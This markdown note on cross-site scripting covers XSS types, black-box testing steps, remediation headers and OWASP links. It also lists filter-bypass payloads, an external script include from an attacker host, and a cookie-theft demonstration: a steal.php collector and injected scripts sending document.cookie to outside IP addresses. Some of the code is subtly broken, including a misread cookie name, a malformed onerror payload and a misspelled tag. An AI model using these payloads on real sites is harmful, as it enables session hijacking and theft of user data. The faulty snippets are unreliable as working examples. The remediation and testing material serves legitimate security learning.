# XSS

## Information
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into trusted website.

XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

OWASP TOP 10: A7-Cross-Site Scripting (XSS)

## Impact
Malicious script can access any cookies, session tokens, or other sensitive information

## Types of XSS
- **Stored XSS (Persistent XSS)**:
When an attacker injects malicious code into the vulnerable application and this content is permanently stored in a database. when victims visit a  vulnerable application page with the stored malicious code, that time their browser execute this code and victim get popup message.

- **Reflected XSS (Non-persistent)**:
When an attacker uses a malicious link, phishing email, or another social engineering technique to trap the victim into making a request to the server and this request contains malicious code. when victim click on link then browser receive a reply with the malicious code and executes it. 

- **DOM Based XSS**:
When the web application writes user input to the Document Object Model (DOM), then reads the data from the DOM and executes it in the browser.In DOM based XSS malicious code is not sent to the server which makes it difficult to detect by web application firewalls (WAFs).

## How to Test (Black Box Testing)
***1. Detect input vectors. For each web page***
- HTTP parameters
- POST data
- Hidden form field values
- Predefined Radio or Selection values

***2. Analyze each input vector to detect potential vulnerabilities***
- (greater than)>
- <(less than) 
- &(ampersand) 
- '(apostrophe or single quote) 
- "(double quote)
- e. g. <script>alert(123)</script>

***3. POC***
```
<script>alert(document.cookie)</script>
<script>alert(document.location)</script>
```

## HTML Filtered Content
- \n (new line) 
- \r (carriage return) 
- \' (apostrophe or single quote) 
- \" (double quote) 
- \\ (backslash) 
- \uXXXX (unicode values)

## Bypass XSS Filters 
Filters are based on a blacklist, they could not block every type of expressions

### e.g. payload’s:
***1. Different Syntax | Encoding***
```
" onfocus="alert(document.cookie)
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3cscript%3ealert(document.cookie)%3c/script%3e
```
***2. Bypassing non-recursive filtering***
```
<scr<script>ipt>alert(document.cookie)</script>
```
***3. Including external script***
```
<script src="http://attacker/xss.js"></script>
http://example/?var=<SRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
```

   - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet (XSS Filter Evasion Cheat Sheet)
   - https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection

## XSS - Remediation     
### Server-Side Validation
- [x] X-XSS-Protection
```
X-XSS-Protection: 0
X-XSS-Protection: 1
X-XSS-Protection: 1; mode=block
X-XSS-Protection: 1; report=<reporting-uri>
```
- ***0***	xss filter disabled
- ***1***	xss filter enabled and sanitized the page if attack detected
- ***1;mode=block***	xss filter enabled and prevented rendering the page if attack detected
- ***1;report=http://example.com/report_URI***	xss filter enabled and reported the violation if attack detected

***Refrence:***
* https://geekflare.com/http-header-implementation/#X-XSS-Protection
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection

### Client/Application side Validation
* https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet (XSS Prevention Cheat Sheet)
* https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet (DOM based XSS Prevention Cheat Sheet)
* https://www.wordfence.com/learn/how-to-prevent-cross-site-scripting-attacks   (Functions to Validate your Data)

## XSS - Demonstration
Retrieve User Cookie Using XSS
1. Create ***steal.php*** file contect with below code.
```
<?php
$cookie=$_COOKIE['PHPSSID'];
$file=fopen('cookie.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>
```
2. Create ***cookie.txt*** file on same directory.
3. Host ***steal.php*** page publicaly which can accessible through internet.
4. Insert Script on Vulnerable Parameter.
```
<script>document.location="http://hostname/steal.php"</script>
e.g:
<script>document.location="http://192.168.88.128/steal.php"</script>

<img src=a onerror=confirm(document.location="http://192.168.88.130/steal.php?cookie=" + document.cookie;)>

```
